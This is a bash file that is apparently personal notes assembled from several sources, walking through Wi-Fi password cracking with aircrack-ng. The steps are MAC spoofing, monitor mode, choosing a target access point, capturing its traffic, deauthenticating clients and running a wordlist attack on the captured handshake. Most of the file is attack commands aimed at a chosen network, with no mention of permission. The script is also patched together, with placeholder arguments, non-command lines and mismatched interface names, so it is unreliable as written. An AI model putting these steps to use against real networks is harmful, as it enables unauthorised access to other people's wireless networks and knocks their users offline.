#!/bin/bash

 # =========================
 # = Macbook atheros howto
 # =
 # =========================
 
 
# How to get the atheros card to work:
# 
# 1. first disable the interface using:

airmon-ng stop ath0

ifconfig wifi0 down

macchanger --mac 00:11:22:33:44:55 wifi0


# 2. enable the interface in monitor mode using:

airmon-ng start wifi0


# 3. find your network using:

airodump-ng ath0


# [You should get a response like the following, and then push control-C once you see the network you want:
# 
# CH 11 ][ Elapsed: 1 min ][ 2007-12-26 22:37
# BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID
# 
# 00:15:A0:01:C1:05 13 37 0 0 6 54 WEP WEP linksys]


# 4. stop the atheros interface using:

ifconfig ath0 down

# 5. reconfigure the atheros interface to the channel (CH = 6) and rate (MB = 54) used by the target AP (essid = linksys, BSSID = 00:15:A0:01:C1:05) that you found in step 3:

iwconfig ath0 rate 54M channel 6

# 6. start the atheros interface using the new settings:

ifconfig ath0 up

# 7. record the signals from the AP (-w is the filename for saving the information, -b is the target bssid):
# airodump-ng -w linksys_data -b 00:15:A0:01:C1:05 -c 6 ath0

# 8. get data faster by running aireplay-ng attacks then use aircrack-ng to get the password.



ath0 set up


# In order to get the modem into monitor mode we must first get rid of all the managed mode VAPs.

# Type : 

iwconfig


# You will see your card as ath0 in manged mode. In order to stop that VAP we must use a utility call wlanconfig.

# Type : 

wlanconfig ath0 destroy

# Now if run iwconfig you should not see your ath0 VAP anymore. Now we have to create a new VAP in monitor mode. Here's how:

# Type : 

wlanconfig ath0 create wlandev wifi0 wlanmode monitor

# Now when you run iwconfig you should see your ath0 VAP in monitor mode.

# Now to make sure ath0 is 'UP' (as explained in the previous post)

# Type : 

ifconfig mon0 up




# Hak 5
# 
# put card into monitor mode
airmon-ng stop wlan0

airmon-ng start wlan0 (channel number)

# eg
# 
# airmon-ng start wlan0 11
# 
# for channel 11

airodump-ng -c 11 --bssid (bssid) -w psk ath0


# eg 
# 
# airodump-ng -c 11 --bssid 00:18:4d:3a:fe:e8 -w psk ath0


# de authenticate 
aireplay-ng -0 5 -a ( access point bssid ) -c (client bssid ) ath0


# word list
aircrack-ng -w word.lst -b (access point)  psk*.cap
